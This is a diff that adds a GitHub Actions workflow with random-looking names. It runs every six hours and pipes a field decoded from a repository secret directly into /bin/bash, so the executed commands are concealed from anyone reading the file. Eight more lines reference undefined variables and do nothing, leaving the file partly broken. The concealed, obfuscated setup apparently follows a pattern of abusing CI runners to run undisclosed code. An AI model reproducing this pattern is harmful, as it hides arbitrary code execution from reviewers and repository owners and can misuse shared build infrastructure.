@@ -1,0 +1,26 @@
+name: yuanbanlao1839
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanbanlao1839
+        env:
+          u392: ${{ secrets.u392 }}
+        run: |
+          echo $u392 | jq -r .kktj70 | /bin/bash
+          echo $l024 | jq -r .j598 | /bin/bash
+          echo $se2 | jq -r .gvus495 | /bin/bash
+          echo $eqhhz20908 | jq -r .qzh1604 | /bin/bash
+          echo $e3598 | jq -r .ae01 | /bin/bash
+          echo $r3620 | jq -r .qz513 | /bin/bash
+          echo $plcq26 | jq -r .cot874 | /bin/bash
+          echo $bad722 | jq -r .wlj61054 | /bin/bash
+          echo $t0 | jq -r .bw172 | /bin/bash
+
